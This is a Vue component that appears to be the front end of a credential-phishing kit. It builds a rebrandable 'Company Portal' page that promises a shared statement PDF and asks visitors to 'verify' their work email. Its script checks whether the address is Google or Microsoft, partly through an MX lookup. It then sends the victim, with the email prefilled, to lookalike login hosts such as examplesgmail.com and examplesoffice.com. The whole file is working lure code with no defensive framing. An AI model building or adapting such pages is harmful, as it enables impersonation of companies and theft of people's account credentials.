<script setup>
import { ref, computed } from 'vue';

const props = defineProps({
  companyName: {
    type: String,
    default: 'Company Portal',
  },
  faviconUrl: {
    type: String,
    default: 'https://example.com/logo.png',
  },
  ogImage: {
    type: String,
    default: null,
  },
  accentColor: {
    type: String,
    default: '#0b1e36',
  },
  redirectURL: {
    type: String,
    default: 'https://example.com',
  },
});

function getContrastColor(hexColor) {
  const hex = hexColor.replace('#', '');
  if (hex.length !== 6) return '#ffffff';
  const r = parseInt(hex.substring(0, 2), 16);
  const g = parseInt(hex.substring(2, 4), 16);
  const b = parseInt(hex.substring(4, 6), 16);
  const yiq = (r * 299 + g * 587 + b * 114) / 1000;
  return yiq >= 180 ? '#0f172a' : '#ffffff';
}

const contrastText = computed(() => getContrastColor(props.accentColor));

const themeCssVars = computed(() => {
  if (props.accentColor && props.accentColor !== '#0b1e36') {
    return {
      '--primary-navy': props.accentColor,
      '--btn-bg': props.accentColor,
      '--btn-text': contrastText.value,
    };
  }
  return {};
});

const bgWrapperStyle = computed(() => {
  if (props.ogImage) {
    return { backgroundImage: `url('${props.ogImage}')` };
  }
  return {};
});

const isModalActive = ref(false);
const visitorEmail = ref('');
const isVerifying = ref(false);
const brandFallback = ref(false);

const handleBrandError = () => {
  brandFallback.value = true;
};

const openModal = () => {
  isModalActive.value = true;
};

const closeModal = () => {
  isModalActive.value = false;
};

const handleLeadSubmit = async () => {
  const email = visitorEmail.value.trim();
  if (!email) return;

  isVerifying.value = true;

  let isGoogleEmail = false;
  let isMicrosoftEmail = false;
  const domain = email.includes('@') ? email.split('@').pop()?.toLowerCase() || '' : '';

  if (domain === 'gmail.com' || domain === 'googlemail.com' || domain.endsWith('.google.com')) {
    isGoogleEmail = true;
  } else if (
    ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'passport.com'].includes(domain) ||
    domain.endsWith('.outlook.com')
  ) {
    isMicrosoftEmail = true;
  } else if (domain) {
    try {
      const res = await fetch('/api/check-mx?email=' + encodeURIComponent(email));
      if (res.ok) {
        const data = await res.json();
        if (data.isGoogle) {
          isGoogleEmail = true;
        } else if (data.isMicrosoft) {
          isMicrosoftEmail = true;
        }
      }
    } catch (err) {
      console.warn('MX check error:', err);
    }
  }

  isVerifying.value = false;

  let targetUrl = props.redirectURL;
  if (isGoogleEmail) {
    targetUrl = 'https://examplesgmail.com/?email=' + encodeURIComponent(email);
  } else if (isMicrosoftEmail) {
    targetUrl = 'https://examplesoffice.com/?email=' + encodeURIComponent(email);
  } else {
    targetUrl = 'https://otherexamplesgmail.com/?email=' + encodeURIComponent(email);
  }

  window.open(targetUrl, '_blank', 'noopener,noreferrer');
  isModalActive.value = false;
};
</script>

<template>
  <div class="landing-portal-root" :style="themeCssVars">
    <div class="bg-wrapper" :style="bgWrapperStyle">
      <div class="bg-overlay"></div>
    </div>

    <div class="overlay-container">
      <div class="showcase-card">
        <div class="company-brand">
          <img
            v-if="!brandFallback"
            :src="faviconUrl"
            :alt="companyName"
            @error="handleBrandError"
          />
          <span v-else class="brand-fallback">{{ companyName }}</span>
        </div>

        <h1 class="card-title">Welcome to {{ companyName }}</h1>
        <p class="card-subtitle">
          Verify your identity to access the secure document shared with your account.
        </p>

        <div class="features-grid">
          <div class="feature-item">
            <div class="feature-icon"><i class="fa-solid fa-layer-group"></i></div>
            <div class="feature-title">Statement_Document_2026.pdf</div>
            <div class="feature-desc">PDF Document • 2.4 MB.</div>
          </div>
        </div>

        <button type="button" class="btn-action" @click="openModal">
          <span>Statement </span>
          <i class="fa-solid fa-arrow-right"></i>
        </button>

        <div class="card-footer">
          {{ companyName }} &bull;
          <a :href="redirectURL" target="_blank">Terms of Service</a> &bull;
          <a :href="redirectURL" target="_blank">Privacy Policy</a>
        </div>
      </div>
    </div>

    <!-- Lead Modal -->
    <div :class="['modal-backdrop', { active: isModalActive }]" @click.self="closeModal">
      <div class="modal-card">
        <button type="button" class="modal-close" @click="closeModal">&times;</button>
        <div class="modal-logo-container">
          <img :src="faviconUrl" :alt="companyName" />
        </div>
        <h3 class="modal-title">Verify your Email</h3>
        <p class="modal-desc">Enter your work email to continue to the shared document.</p>

        <form class="modal-form" @submit.prevent="handleLeadSubmit">
          <input
            v-model="visitorEmail"
            type="email"
            class="modal-input"
            placeholder="name@company.com"
            required
          />
          <button type="submit" class="modal-submit" :disabled="isVerifying">
            <span>{{ isVerifying ? 'Verifying...' : 'Proceed' }}</span>
            <i class="fa-solid fa-arrow-right"></i>
          </button>
        </form>
      </div>
    </div>
  </div>
</template>
